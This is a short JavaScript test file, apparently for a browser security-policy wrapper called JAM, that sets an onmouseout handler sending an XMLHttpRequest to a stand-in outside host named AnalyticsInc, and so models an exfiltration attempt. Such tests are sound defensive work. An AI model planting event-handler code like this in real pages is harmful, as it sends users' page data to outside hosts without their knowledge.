// exfil_test_onmouseout1.js
var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=onmouseout1", true);xmlhttp.send(null);';
var v0 = document.getElementById("test");
JAM.call(v0.setAttribute, v0, ["onmouseout", exp], JAM.policy.p1)

